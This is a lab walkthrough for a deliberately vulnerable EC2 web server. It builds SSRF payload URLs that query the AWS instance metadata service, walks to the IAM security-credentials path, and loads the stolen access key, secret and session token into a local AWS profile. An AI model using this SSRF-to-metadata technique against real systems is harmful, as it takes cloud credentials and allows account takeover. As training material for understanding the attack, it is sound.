1.  From the console, locate the ec2 instance that was provisioned. 


<br />
<br />
2.  In a seperate browser window, navigate to the public IP address of the ec2 instance.  

You can find the public IP by clicking on the instance, and going to `Details`, then `Public IPv4 address`.

<b> ** Make sure that you change the url to use http, as that is how we have configured our security group. ** </b>

```script 
 http://<public_ipv4_address>/
```

We can see that the web server is running, but it looks like it's expecting a query string.  We need to construct an SSRF payload.


<br />
<br />
3.  First, let's look at some of the metadata categories available:  

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/
```

These are all categories of information that the ec2 instance would be able to access during it's day to day actions.


<br />
<br />
4.  By navigating through the API structure, we can eventually get to credentials.  Paste each url into your browser to work through the API directory structure.   
<br />
<br />
<b> Variables Required </b>  
{Instance-Profile} - The instance profile name will be unique to each environment.  This will be the value listed under `security-credentials`.

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/

 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
 
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{Instance-Profile}
```

<br />
<br />
5.  These are the credentials of the instance profile that is being used by the ec2 instance.  By making a profile using these credentials, we will be able to execute AWS API calls using the identity of the ec2 instance instance profile.  

Copy the value of `AccessKeyId`, `SecretAccessKey` and `Token`, and use it to configure a profile called `ssrf-demo`.  
<br />

In order to do this, open your aws credential file in a text editor.  By default, credential files are stored in the following places:   
    - Windows: `C:\Users\username\.aws\credentials`  
    - Linux: `~/.aws/credentials`

Create a new entry called `ssrf-demo`.  

<b> Variables Required </b>  
- {AccessKeyId} - The Access key as found in the browser window.
- {SecretAccessKey} - The Secret Access key, as shown in the browser
- {Token} - The Token value, as shown in the browser
<br />
<br />
```script
    [ssrf-demo]
    aws_access_key_id = ${AccessKeyId}
    aws_secret_access_key = ${SecretAccessKey}
    aws_session_token = ${Token}
```
